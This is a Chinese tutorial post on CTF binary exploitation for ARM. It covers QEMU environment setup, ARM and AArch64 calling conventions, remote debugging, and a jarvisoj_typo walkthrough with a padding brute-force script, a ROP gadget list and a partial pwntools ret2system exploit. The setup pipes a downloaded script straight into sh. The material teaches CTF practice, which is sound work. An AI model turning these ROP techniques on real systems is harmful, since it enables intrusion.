
# ARM架构下的 Pwn 的一般解决思路


                                阅读量   
                                **750650**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/199112/t01344f85db797fd7d8.jpg)](./img/199112/t01344f85db797fd7d8.jpg)



## 0x01 写在前面

本文作为”Multi-arch Pwn 系列”中的文章之一，因为篇幅过长，只能分架构来总结了。

多架构Pwn的题目虽然不多，但还是想要在这里总结一些常见的思路。

本文的部分内容引用了大佬的博客原文，已在文章末尾的参考链接中注明了原作者。



## 0x02.1 前置环境（基于Mac OS的环境搭建）

我们如果要使用多架构进行利用，我们一般需要安装qemu进行调试。

在 Mac OS 下我们可以使用`brew install qemu`来安装我们所需要的qemu。

但是，我们会发现我们无法使用大多数博客所述的`qemu-arm`来运行静态链接的其他架构程序。

经过查阅官方文档，我们发现官网中已经做了明确说明

> <h2 name="h2-2" id="h2-2">5. QEMU User space emulator</h2>
<h3 name="h3-3" id="h3-3">
<a class="reference-link" name="5.1%20Supported%20Operating%20Systems"></a>5.1 Supported Operating Systems</h3>
The following OS are supported in user space emulation:
<ul>
- – Linux (referred as qemu-linux-user)
- – BSD (referred as qemu-bsd-user)
</ul>

也就是说，仅限Linux系统和BSD系统才能进行用户级别的仿真运行。那么我们尝试进行系统级别的仿真。

此处我们使用树莓派的系统镜像进行模拟。

### 准备`qemu kernel`

Kernel下载链接：[https://github.com/dhruvvyas90/qemu-rpi-kernel](https://github.com/dhruvvyas90/qemu-rpi-kernel)

System Image下载链接：[https://www.raspberrypi.org/downloads/raspbian/](https://www.raspberrypi.org/downloads/raspbian/)

此处因为网络原因导致镜像下载受阻，于是采用另一位大佬给出的替代方案~

### <a class="reference-link" name="%E5%85%B3%E4%BA%8E%E5%90%AF%E5%8A%A8%E9%80%89%E9%A1%B9%E7%9A%84%E8%AF%B4%E6%98%8E"></a>关于启动选项的说明

`-kernel kernel-qemu`：指定启动所加载的内核文件类型，此处使用下载的内核映像类型`kernel-qemu`。

`-cpu arm1176`：指定启动所使用的CPU文件，此处模拟`ARM1176 CPU`。`Raspberry Pi`板上搭载了`Broadcom BCM2835`，这个处理器用的是`ARM1176JZ-F`。

`-m 256`：指定仿真系统可使用的内存大小，此处RAM的大小是256MB. 设定成比256MB大的值板子好像不能启动.

`-M versatilepb`：设定模拟的开发板类型。`versatilepb`是`ARM Versatile Platform Board`。

`-kernel kernel-qemu-4.4.34-jessie`：指定启动所加载的内核镜像，此处使用下载的内核映像`kernel-qemu-4.4.34-jessie`。

`-append "root=/dev/sda2"`：指定内核的命令行。

`-hda 2013-09-25-wheezy-raspbian.img`：`Harddisk 0`使用`2013-09-25-wheezy-raspbian.img`。



## 0x02.2 前置环境（基于Deepin4的环境搭建）

本部分全文基本全文引用[如何 pwn 掉一个 arm 的binary——m4x](https://m4x.fun/post/how-2-pwn-an-arm-binary/)，故做二次版权声明。

### <a class="reference-link" name="%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%E2%80%94%E2%80%94%E6%9B%B4%E6%96%B0apt%E6%BA%90%E3%80%81%E5%AE%89%E8%A3%85%E5%BF%85%E5%A4%87%E8%BD%AF%E4%BB%B6"></a>虚拟机前期准备工作——更新apt源、安装必备软件

```
sudo apt-get update
sudo apt-get upgrade
sudo apt-get install screenfetch git vim python python-pip python3 python3-pip gdb gdb-multiarch cmake time
wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh
pip3 install --user unicorn keystone-engine capstone -i https://pypi.tuna.tsinghua.edu.cn/simple
git clone https://github.com/sashs/filebytes.git
cd filebytes
sudo python3 setup.py install
git clone https://github.com/sashs/ropper.git
cd ropper
sudo python3 setup.py install
cd ~
wget https://github.com/keystone-engine/keystone/archive/0.9.1.tar.gz
tar xzvf 0.9.1.tar.gz
cd keystone-0.9.1/
mkdir build
cd build
../make-share.sh
sudo make install
sudo ldconfig
kstool
pip3 install --user ropper keystone-engine -i https://pypi.tuna.tsinghua.edu.cn/simple
sudo pip install pwntools
```

### <a class="reference-link" name="%E5%AE%89%E8%A3%85QEMU%E5%8F%8A%E5%85%B6%E4%BE%9D%E8%B5%96"></a>安装QEMU及其依赖

```
sudo apt-get install qemu-user
```

### <a class="reference-link" name="%E5%AE%89%E8%A3%85%E5%8A%A8%E6%80%81%E8%BF%90%E8%A1%8C%E5%BA%93%EF%BC%88%E4%B8%8D%E8%BF%90%E8%A1%8C%E6%AD%A4%E6%AD%A5%E9%AA%A4%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%BF%90%E8%A1%8C%E9%9D%99%E6%80%81%E5%A4%9A%E6%9E%B6%E6%9E%84%E7%A8%8B%E5%BA%8F%EF%BC%89"></a>安装动态运行库（不运行此步骤也可以运行静态多架构程序）

使用命令`apt-cache search "libc6" | grep -E "arm|mips"`搜索可用的多架构运行库。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-01-27-115916.png)

我们只需要安装形如`libc6-*-cross`的运行库即可。

使用命令`sudo apt-get install libc6-arm64-cross libc6-armel-cross libc6-armhf-cross libc6-mips-cross libc6-mips32-mips64-cross libc6-mips32-mips64el-cross libc6-mips64-cross libc6-mips64-mips-cross libc6-mips64-mipsel-cross libc6-mips64el-cross libc6-mipsel-cross libc6-mipsn32-mips-cross libc6-mipsn32-mips64-cross libc6-mipsn32-mips64el-cross libc6-mipsn32-mipsel-cross`安装。

### <a class="reference-link" name="%E5%AE%89%E8%A3%85binutils%E7%8E%AF%E5%A2%83"></a>安装binutils环境

当我们使用`Pwntools`里的`asm`命令时，可能会报如下错误：

```
dpkg-query: 没有找到与 *bin/armeabi*linux*-as* 相匹配的路径
[ERROR] Could not find 'as' installed for ContextType(arch = 'arm', bits = 32, endian = 'little', log_level = 10)
    Try installing binutils for this architecture:
    https://docs.pwntools.com/en/stable/install/binutils.html

```

此时我们需要安装binutils依赖，首先使用命令`apt search binutils | grep [arch]`(此处的[arch]请自行替换)

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-081701.png)

随后安装显示出的包即可完成

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-17-081732.png)



## 0x02.3 前置环境（基于ARM_NOW的环境搭建）

项目地址：[https://github.com/nongiach/arm_now](https://github.com/nongiach/arm_now)

根据项目简介所述：

> arm_now is a qemu powered tool that allows instant setup of virtual machines on arm cpu, mips, powerpc, nios2, x86 and more, for reverse, exploit, fuzzing and programming purpose.
arm_now是一款基于qemu的强大的工具，它允许在arm-cpu，mips，powerpc，nios2，x86等平台上即时设置虚拟机，以进行程序逆向，利用，模糊测试和编程工作。

项目使用wiki：[https://github.com/nongiach/arm_now/wiki](https://github.com/nongiach/arm_now/wiki)



## 0x03 相关知识

### <a class="reference-link" name="ARM%20%E6%9E%B6%E6%9E%84"></a>ARM 架构

ARM架构使用了与Intel/AMD架构所不同的精简指令集(RISC)，因此其函数调用约定以及寄存器也有了一定的差异。

#### <a class="reference-link" name="%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%E6%A0%87%E5%87%86"></a>过程调用标准

ARM/ARM64使用的是AAPCS或ATPCS标准。

ATPCS即为ARM-Thumb Procedure Call Standard/ARM-Thumb过程调用标准，规定了一些子程序间调用的基本规则，这些规则包括子程序调用过程中寄存器的使用规则，数据栈的使用规则，参数的传递规则。有了这些规则之后，单独编译的C语言程序就可以和汇编程序相互调用。使用ADS(ARM Developer Suite)的C语言编译器编译的C语言子程序满足用户指定的ATPCS类型。而对于汇编语言来说，则需要用户来保证各个子程序满足ATPCS的要求。而AAPCS即为ARM Archtecture Procedure Call Standard是2007年ARM公司正式推出的新标准，AAPCS是ATPCS的改进版，目前， AAPCS和ATPCS都是可用的标准。

#### <a class="reference-link" name="%E5%AF%84%E5%AD%98%E5%99%A8%E8%A7%84%E5%88%99"></a>寄存器规则
1. 子程序间通过寄存器**R0～R3**来**传递参数**。这时，寄存器R0～R3可记作arg0～arg3。**被调用的子程序在返回前无需恢复寄存器R0～R3的内容，R0被用来存储函数调用的返回值**。
1. 在子程序中，使用寄存器**R4～R11**来**保存局部变量**。这时，寄存器R4～R11可以记作var1～var8。如果在子程序中使用了寄存器v1～v8中的某些寄存器，则**子程序进入时必须保存这些寄存器的值，在返回前必须恢复这些寄存器的值**。**R7经常被用作存储系统调用号，R11存放着帮助我们找到栈帧边界的指针，记作FP**。在Thumb程序中，通常只能使用寄存器R4～R7来保存局部变量。
1. 寄存器**R12**用作**过程调用中间临时寄存器**，记作IP。在子程序之间的连接代码段中常常有这种使用规则。
1. 寄存器**R13**用作**堆栈指针**，记作SP。在子程序中寄存器R13不能用作其他用途。**寄存器SP在进入子程序时的值和退出子程序时的值必须相等**。
1. 寄存器**R14**称为**连接寄存器**，记作LR。它用于**保存子程序的返回地址**。如果在子程序中保存了返回地址，寄存器R14则可以用作其他用途。
1. 寄存器**R15**是**程序计数器**，记作PC。它不能用作其它用途。当执行一个分支指令时，**PC存储目的地址。在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，Thumb(v1)模式下的PC存储着当前指令加4(两条Thumb指令后)的位置**。
给出ARM架构寄存器与Intel架构寄存器的关系：

<th style="text-align: center;">ARM架构 寄存器名</th><th style="text-align: center;">寄存器描述</th><th style="text-align: center;">Intel架构 寄存器名</th>
|------
<td style="text-align: center;">R0</td><td style="text-align: center;">通用寄存器</td><td style="text-align: center;">EAX</td>
<td style="text-align: center;">R1~R5</td><td style="text-align: center;">通用寄存器</td><td style="text-align: center;">EBX、ECX、EDX、EDI、ESI</td>
<td style="text-align: center;">R6~R10</td><td style="text-align: center;">通用寄存器</td><td style="text-align: center;">无</td>
<td style="text-align: center;">R11(FP)</td><td style="text-align: center;">栈帧指针</td><td style="text-align: center;">EBP</td>
<td style="text-align: center;">R12(IP)</td><td style="text-align: center;">内部程序调用</td><td style="text-align: center;">无</td>
<td style="text-align: center;">R13(SP)</td><td style="text-align: center;">堆栈指针</td><td style="text-align: center;">ESP</td>
<td style="text-align: center;">R14(LP)</td><td style="text-align: center;">链接寄存器</td><td style="text-align: center;">无</td>
<td style="text-align: center;">R15(PC)</td><td style="text-align: center;">程序计数器</td><td style="text-align: center;">EIP</td>
<td style="text-align: center;">CPSR</td><td style="text-align: center;">程序状态寄存器</td><td style="text-align: center;">EFLAGS</td>

#### <a class="reference-link" name="%E5%A0%86%E6%A0%88(Stack)%E8%A7%84%E5%88%99"></a>堆栈(Stack)规则
1. ATPCS规定堆栈为FD类型，即Full Descending，意思是 **SP指向最后一个压入的值(栈顶)，数据栈由高地址向低地址生长**，即满递减堆栈，并且对堆栈的操作是8字节对齐。所以经常使用的指令就有**STMFD和LDMFD**。
<li>STMFD指令即Store Multiple FULL Descending指令，相当于压栈。`STMFD SP! ,{R0-R7，LR}`实际上会执行以下命令：
<pre><code class="lang-c hljs cpp">SP = SP - 9 x 4 (共计压入R0-R7以及LR一共九个寄存器)
ADDRESS = SP
MEMORY[ADDRESS] = LR
for i = 7 to 0
    MEMORY[ADDRESS] = Ri
    ADDRESS = ADDRESS + 4
</code></pre>
此处也可以看出，事实上的入栈顺序与`R0-R7，LR`相反。
<ol>
<li>执行`SP = SP - 9 x 4`后[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-03-032143.png)
</li>
<li>执行`ADDRESS = SP`后[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-03-032503.png)
</li>
<li>执行`MEMORY[ADDRESS] = LR`后[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-03-032741.png)
</li>
<li>接下来，`ADDRESS`逐次上移，以此填入寄存器的值。[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-03-032925.png)
</li>
1. 至此，入栈指令执行结束。
⚠️：若入栈指令为`STMFD SP ,{R0-R7，LR}`，SP指针会在最后回到原位，不会改变SP指针的值。

```
SP = SP + 9 x 4
ADDRESS = SP
for i = 0 to 7
    Ri = MEMORY[ADDRESS]
    ADDRESS = ADDRESS - 4
LR = MEMORY[ADDRESS]
```
1. 外部接口的堆栈必须是8字节对齐的。
1. 在汇编程序中使用PRESERVE8伪指令告诉连接器，本汇编程序数据是8字节对齐的。
#### <a class="reference-link" name="%E4%BC%A0%E5%8F%82%E8%A7%84%E5%88%99"></a>传参规则
1. 对于参数个数可变的子程序，当参数个数不超过4个时，可以使用寄存器R0～R3来传递参数；当参数超过4个时，还可以使用堆栈来传递参数。
<li>在传递参数时，将所有参数看作是存放在连续的内存字单元的字数据。然后，依次将各字数据传递到寄存器R0，R1，R2和R3中。**如果参数多于4个，则将剩余的字数据传递到堆栈中。入栈的顺序与参数传递顺序相反，即最后一个字数据先入栈。**
</li>
#### <a class="reference-link" name="%E8%BF%94%E5%9B%9E%E5%80%BC%E8%A7%84%E5%88%99"></a>返回值规则
1. 结果为一个32位整数时，可以通过寄存器R0返回
1. 结果为一个64位整数时，可以通过寄存器R0和R1返回
1. 结果为一个浮点数时，可以通过浮点运算部件的寄存器f0、d0或s0来返回
1. 结果为复合型浮点数（如复数）时，可以通过寄存器f0～fn或d0～dn来返回
1. 对于位数更多的结果，需要通过内存来传递。
#### <a class="reference-link" name="%E8%AE%BF%E5%9D%80%E8%A7%84%E5%88%99"></a>访址规则
<li>通常，LDR指令被用来从内存中加载数据到寄存器，STR指令被用作将寄存器的值存放到内存中。
<pre><code class="lang-assembly">@ LDR操作：从R0指向的地址中取值放到R2中
LDR R2, [R0]   @ [R0] - 数据源地址来自于R0指向的内存地址
@ STR操作：将R2中的值放到R1指向的地址中
STR R2, [R1]   @ [R1] - 目的地址来自于R1在内存中指向的地址
</code></pre>
那么我们给出示例代码和解释：
<pre><code class="lang-assembly">.data          /* 数据段是在内存中动态创建的，所以它的在内存中的地址不可预测*/
var1: .word 3  /* 内存中的第一个变量且赋值为3 */
var2: .word 4  /* 内存中的第二个变量且赋值为4 */

.text          /* 代码段开始 */ 
.global _start

_start:
    ldr r0, adr_var1  @ 将存放var1值的地址adr_var1加载到寄存器R0中 
    ldr r1, adr_var2  @ 将存放var2值的地址adr_var2加载到寄存器R1中 
    ldr r2, [r0]      @ 将R0所指向地址中存放的0x3加载到寄存器R2中  
    str r2, [r1]      @ 将R2中的值0x3存放到R1做指向的地址，此时，var2变量的值是0x3
    bkpt        

adr_var1: .word var1  /* var1的地址助记符 */
adr_var2: .word var2  /* var2的地址助记符 */
</code></pre>
接下来我们对这段代码进行反编译，结果如下：
<pre><code class="lang-assembly">ldr  r0, [ pc, #12 ]   ; 0x8088 &lt;adr_var1&gt;
ldr  r1, [ pc, #12 ]   ; 0x808c &lt;adr_var2&gt;
ldr  r2, [r0]
str  r2, [r1]
bx   lr
</code></pre>
此处，`[PC,#12]`的意义是`PC + 4*3`，可以看出，程序使用了偏移寻址的思路，但是，根据我们所写的汇编码：
<pre><code class="lang-assembly">_start:
    ldr  r0, [ pc, #12 ]   ; &lt;- PC
    ldr  r1, [ pc, #12 ]   
    ldr  r2, [r0]
    str  r2, [r1]
    bx   lr       

adr_var1: .word var1  
adr_var2: .word var2
</code></pre>
我们若想获取var_1，应该为`PC + 4 * 5`才对，但是我们之前提过的，**在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置**，也就是说，此时程序中的状况应该如下表所示：
<pre><code class="lang-assembly">_start:
    ldr  r0, [ pc, #12 ]
    ldr  r1, [ pc, #12 ]   
    ldr  r2, [r0]          ; &lt;- PC
    str  r2, [r1]
    bx   lr       

adr_var1: .word var1  
adr_var2: .word var2
</code></pre>
这种形如`[Ri , num]`的方式被称为**立即数作偏移寻址**。
<pre><code class="lang-assembly">str r2, [r1, #2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。
str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1=R1+4。
ldr r3, [r1], #4  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1=R1+4。
</code></pre>
</li>
<li>形如`[Ri , Rj]`的方式被称为**寄存器作偏移寻址**。
<pre><code class="lang-assembly">str r2, [r1, r2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 
str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1=R1+R2。
ldr r3, [r1], r2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1=R1+R2。
</code></pre>
</li>
<li>形如`[Ri , Rj , &lt;shifter&gt;]`的方式被称为**寄存器缩放值作偏移寻址**。
<pre><code class="lang-assembly">str r2, [r1, r2, LSL#2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。
str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2&lt;&lt;2。
ldr r3, [r1], r2, LSL#2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 = R1 + R2&lt;&lt;2。
</code></pre>
</li>
### <a class="reference-link" name="AArch64%20%E6%9E%B6%E6%9E%84"></a>AArch64 架构

需要指出的是，AArch64架构并不是ARM-32架构的简单扩展，他是在ARMv8引入的一种全新架构。

#### <a class="reference-link" name="%E5%AF%84%E5%AD%98%E5%99%A8%E5%8F%98%E5%8C%96"></a>寄存器变化

AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫Xn，运行在32位的时候就叫Wn。

<th style="text-align: center;">寄存器</th><th style="text-align: center;">别名</th><th style="text-align: center;">意义</th>
|------
<td style="text-align: center;">SP</td><td style="text-align: center;">–</td><td style="text-align: center;">Stack Pointer:栈指针</td>
<td style="text-align: center;">R30</td><td style="text-align: center;">LR</td><td style="text-align: center;">Link Register:在调用函数时候，保存下一条要执行指令的地址。</td>
<td style="text-align: center;">R29</td><td style="text-align: center;">FP</td><td style="text-align: center;">Frame Pointer:保存函数栈的基地址。</td>
<td style="text-align: center;">R19-R28</td><td style="text-align: center;">–</td><td style="text-align: center;">Callee-saved registers（含义见上面术语解释）</td>
<td style="text-align: center;">R18</td><td style="text-align: center;">–</td><td style="text-align: center;">平台寄存器，有特定平台解释其用法。</td>
<td style="text-align: center;">R17</td><td style="text-align: center;">IP1</td><td style="text-align: center;">The second intra-procedure-call temporary register……</td>
<td style="text-align: center;">R16</td><td style="text-align: center;">IP0</td><td style="text-align: center;">The first intra-procedure-call temporary register……</td>
<td style="text-align: center;">R9-R15</td><td style="text-align: center;">–</td><td style="text-align: center;">临时寄存器</td>
<td style="text-align: center;">R8</td><td style="text-align: center;">–</td><td style="text-align: center;">在一些情况下，返回值是通过R8返回的</td>
<td style="text-align: center;">R0-R7</td><td style="text-align: center;">–</td><td style="text-align: center;">在函数调用过程中传递参数和返回值</td>
<td style="text-align: center;">NZCV</td><td style="text-align: center;">–</td><td style="text-align: center;">状态寄存器：N（Negative）负数 Z(Zero) 零 C(Carry) 进位 V(Overflow) 溢出</td>

#### <a class="reference-link" name="%E6%8C%87%E4%BB%A4%E9%9B%86%E5%8F%98%E5%8C%96"></a>指令集变化
1. 除了批量加载寄存器指令 LDM/STM, PUSH/POP, 使用STP/LDP 一对加载寄存器指令代替。
1. 没有提供访问CPSR的单一寄存器，但是提供访问PSTATE的状态域寄存器。
1. A64没有协处理器的概念，没有协处理器指令MCR,MRC。
1. 相比A32少了很多条件执行指令，只有条件跳转和少数数据处理这类指令才有条件执行。
##### <a class="reference-link" name="%E6%8C%87%E4%BB%A4%E5%9F%BA%E6%9C%AC%E6%A0%BC%E5%BC%8F"></a>指令基本格式

`&lt;Opcode&gt;{&lt;Cond&gt;}&lt;S&gt;  &lt;Rd&gt;, &lt;Rn&gt; {,&lt;Opcode2&gt;}`

Opcode：操作码，也就是助记符，说明指令需要执行的操作类型。

Cond：指令执行条件码。

S：条件码设置项,决定本次指令执行是否影响PSTATE寄存器响应状态位值。

Rd/Xt：目标寄存器，A32指令可以选择R0-R14,T32指令大部分只能选择RO-R7，A64指令可以选择X0-X30。

Rn/Xn：第一个操作数的寄存器，和Rd一样，不同指令有不同要求。

Opcode2：第二个操作数，可以是立即数，寄存器Rm和寄存器移位方式（Rm，#shit）。

##### <a class="reference-link" name="%E5%86%85%E5%AD%98%E6%93%8D%E4%BD%9C%E6%8C%87%E4%BB%A4-load/store"></a>内存操作指令-load/store

在分析AArch64架构程序时，会发现我们找不到ARM中常见的STMFD/LDMFD命令，取而代之的是STP/LDP命令。

在ARM-v8指令集中，程序支持以下五种寻址方式：
1. Base register only (no offset) ：基址寄存器无偏移。形如:`[ base { , #0 } ]`。
1. Base plus offset：基址寄存器加偏移。形如:`[ base { , #imm } ]`。
1. Pre-indexed：事先更新寻址，先变化后操作。形如:`[ base , #imm ]!`。⚠️：!符号表示则当数据传送完毕之后，将最后的地址写入基址寄存器，否则基址寄存器的内容不改变。
1. Post-indexed：事后更新寻址，先操作后变化。形如:`[ base ] , #imm`。
1. Literal (PC-relative): PC相对寻址。
常见的Load/Store指令有：

LDR，LDRB，LDRSB，LDRH，LDRSW，STR，STRB，STRH

⚠️：此处R – Register(寄存器)、RB – Byte(字节-8bit)、SB – Signed Byte(有符号字节)、RH – Half Word(半字-16bit)、SW- Signed Word(带符号字-32bit)。

举例：

`LDR X1 , [X2]`——将X2寄存器中的值赋给X1寄存器。

`LDR X1 , [X2] ， #4`——将X2寄存器中的值赋给X1寄存器，然后X2寄存器中的值加4。

对于Load Pair/Store Pair这两个指令：从Memory地址addr处读取两个双字/字数据到目标寄存器Xt1，Xt2。

### <a class="reference-link" name="QEMU%E4%B8%8B%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95"></a>QEMU下的远程调试

以调试方式启动应用程序`qemu-arm -g [port] -L [dynamically linked file] filename`。

这样，程序在启动时将会同时启动gdbserver，程序也会在开头中断等待gdb链接。

新建终端窗口，使用命令`gdb-multiarch filename -q`启动GDB。

进入GDB后，首先使用命令`set architecture [Arch-name]`设置架构。(若安装了能自动识别架构的GDB插件这一步可以省略)

然后使用`target remote localhost:[port]`来链接待调试的程序。(在GEF插件中，若想继续使用GEF插件的部分特性需要将命令改为`gef-remote localhost:[port]`)

此处需要注意，在远程调试下会发现有一部分命令很难用，比如`s/n`这两个指令，当然官网也给出了不可用的原因是：

> s 相当于其它调试器中的“Step Into (单步跟踪进入)”
n 相当于其它调试器中的“Step Over (单步跟踪)”
**这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。**

而我们可以发现，无论是源程序还是libc都是没有调试信息的。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-06-074037.png)

因此我们需要使用`si/ni`指令来替代它们。

然后是vmmap命令对于远端内存情况的查看貌似也差强人意。(尽管此处的远端也是localhost)

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-06-074345.png)



## 0x04 实战演练

### <a class="reference-link" name="%E4%BB%A5jarvisoj_typo%E4%B8%BA%E4%BE%8B"></a>以jarvisoj_typo为例

#### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"></a>程序分析

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-01-27-104017.png)

程序为ARM-32-static程序。

可以发现程序的符号表已经被去除，这极大地增加了我们的分析难度。

因此先使用[Rizzo](https://github.com/fireundubh/IDA7-Rizzo)进行符号表修复，首先用IDA加载`/usr/arm-linux-gnueabihf/lib/libc-2.24.so`。

在IDA的file—&gt;Produce file—&gt;Rizzo signature file中使用Rizzo导出符号表文件。

然后加载题目文件，在IDA的file—&gt;Load file—&gt;Rizzo signature file中使用Rizzo导出加载我们刚才导出的符号表文件，可以看出我们的部分函数符号得到了恢复~

然后我们根据调用的传参规则识别一些函数。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-01-29-084020.png)

此处推测是`write(1,buf,length)`的调用。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-01-29-102157.png)

我们发现，我们无法快速的根据反编译结果确定栈变量偏移。

进一步分析发现程序有大量代码没有被反编译！

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-01-29-121539.png)

在进行进一步跟进分析发现此程序在IDA中大量的识别错误，包括但不限于大量的函数尾识别出错，堆栈分析错误，于是放弃静态分析的利用思路。

#### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"></a>利用思路

考虑使用爆破padding的方式来获取正确的PC控制偏移。

#### <a class="reference-link" name="padding%E7%88%86%E7%A0%B4"></a>padding爆破

```
def get_padding_length():
    length = 0
    while True:
        sh = get_sh()
        sh.recvuntil('if you want to quitn')
        sh.send('n')
        sh.recvrepeat(0.3)
        sh.sendline('A' * length + p32(0x8F00))
        try:
            if 'if you want to quitn' in sh.recvrepeat(0.3):
                return length
            sh.sendline('~')
            log.info('When padding is ' + str(length) + ', Success exit!')
            length = length + 1
            sh.close()
        except:
            log.info('When padding is ' + str(length) + ', Fail exit!')
            length = length + 1
            sh.close()
            pass
```

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-01-30-091254.png)

#### <a class="reference-link" name="Ret2addr"></a>Ret2addr

首先我们找一个合适的gadget用以劫持PC指针，此处我们选用0x00020904处的gadget。

```
error404@error404-PC:/media/psf/Home/Desktop/CTF_question/ARM_dir$ ROPgadget --binary 'typo' --only 'pop|ret'
Gadgets information
============================================================
0x00008d1c : pop {fp, pc}
0x00020904 : pop {r0, r4, pc}
0x00068bec : pop {r1, pc}
0x00008160 : pop {r3, pc}
0x0000ab0c : pop {r3, r4, r5, pc}
0x0000a958 : pop {r3, r4, r5, r6, r7, pc}
0x00008a3c : pop {r3, r4, r5, r6, r7, r8, fp, pc}
0x0000a678 : pop {r3, r4, r5, r6, r7, r8, sb, pc}
0x00008520 : pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc}
0x00068c68 : pop {r3, r4, r5, r6, r7, r8, sl, pc}
0x00014a70 : pop {r3, r4, r7, pc}
0x00008de8 : pop {r4, fp, pc}
0x000083b0 : pop {r4, pc}
0x00008eec : pop {r4, r5, fp, pc}
0x00009284 : pop {r4, r5, pc}
0x000242e0 : pop {r4, r5, r6, fp, pc}
0x000095b8 : pop {r4, r5, r6, pc}
0x000212ec : pop {r4, r5, r6, r7, fp, pc}
0x000082e8 : pop {r4, r5, r6, r7, pc}
0x00043110 : pop {r4, r5, r6, r7, r8, fp, pc}
0x00011648 : pop {r4, r5, r6, r7, r8, pc}
0x00048e9c : pop {r4, r5, r6, r7, r8, sb, fp, pc}
0x0000a5a0 : pop {r4, r5, r6, r7, r8, sb, pc}
0x0000870c : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}
0x00011c24 : pop {r4, r5, r6, r7, r8, sb, sl, pc}
0x000553cc : pop {r4, r5, r6, r7, r8, sl, pc}
0x00023ed4 : pop {r4, r5, r7, pc}
0x00023dbc : pop {r4, r7, pc}
0x00014068 : pop {r7, pc}

Unique gadgets found: 29
```

我们刚才又顺利的恢复了符号表，获取了system函数的位置。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-01-30-091509.png)

接下来我们检索程序中的`/bin/sh`字符串。

[![](./img/199112/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-01-30-091622.png)

于是，我们构造`payload='A'*padding + p32(0x00020904) + p32(0x0006c384) + p32(0x0006c384) + p32(0x000110B4)`

#### <a class="reference-link" name="Final%20exploit"></a>Final exploit

```
from pwn import *
import sys
context.log_level='debug'
context.arch='arm'

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./")
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./typo")

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_padding_length():
    length = 0
    while True:
        sh = get_sh()
        sh.recvuntil('if you want to quitn')
        sh.send('n')
        sh.recvrepeat(0.3)
        sh.sendline('A' * length + p32(0x8F00))
        try:
            if 'if you want to quitn' in sh.recvrepeat(0.3):
                return length
            sh.sendline('~')
            log.info('When padding is ' + str(length) + ', Success exit!')
            length = length + 1
            sh.close()
        except:
            log.info('When padding is ' + str(length) + ', Fail exit!')
            length = length + 1
            sh.close()
            pass

